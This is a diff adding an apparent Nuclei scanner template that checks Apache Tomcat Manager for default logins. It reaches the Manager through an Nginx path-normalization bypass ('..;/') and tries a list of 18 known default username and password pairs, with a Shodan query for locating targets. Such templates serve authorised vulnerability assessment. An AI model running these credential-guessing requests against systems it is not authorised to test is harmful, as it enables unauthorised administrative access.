@@ -1,0 +1,96 @@
+id: tomcat-default-login-normalization
+
+info:
+  name: Apache Tomcat Manager Default Login via Nginx Normalization
+  author: pdteam,sinKettu,reewardius
+  severity: high
+  description: Apache Tomcat Manager default login credentials were discovered. This template checks for multiple variations.
+  reference:
+    - https://www.rapid7.com/db/vulnerabilities/apache-tomcat-default-ovwebusr-password/
+    - https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/multi/http/tomcat_jsp_upload_bypass
+  metadata:
+    max-request: 18
+    shodan-query: title:"Apache Tomcat"
+  tags: java,apache,default-login,tomcat
+
+http:
+  - raw:
+      - |
+        GET /staff/..;/manager HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Basic {{base64(username + ':' + password)}}
+        
+    payloads:
+      username:
+        - tomcat
+        - admin
+        - ovwebusr
+        - j2deployer
+        - cxsdk
+        - ADMIN
+        - xampp
+        - tomcat
+        - QCC
+        - admin
+        - root
+        - role1
+        - role
+        - tomcat
+        - admin
+        - role1
+        - both
+        - admin
+        
+      password:
+        - tomcat
+        - admin
+        - OvW*busr1
+        - j2deployer
+        - kdsxc
+        - ADMIN
+        - xampp
+        - s3cret
+        - QLogic66
+        - tomcat
+        - root
+        - role1
+        - changethis
+        - changethis
+        - j5Brn9
+        - tomcat
+        - tomcat
+        - 123456
+        
+    attack: pitchfork
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Apache Tomcat"
+          - "Server Information"
+        condition: and
+        
+      - type: word
+        part: body
+        words:
+          - "Tomcat Version"
+          - "JVM Version"
+          - "JVM Vendor"
+          - "OS Name"
+          - "OS Version"
+          - "OS Architecture"
+          - "Hostname"
+          - "IP Address"
+        condition: or
+        
+      - type: status
+        status:
+          - 200
+          
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "401 Unauthorized"
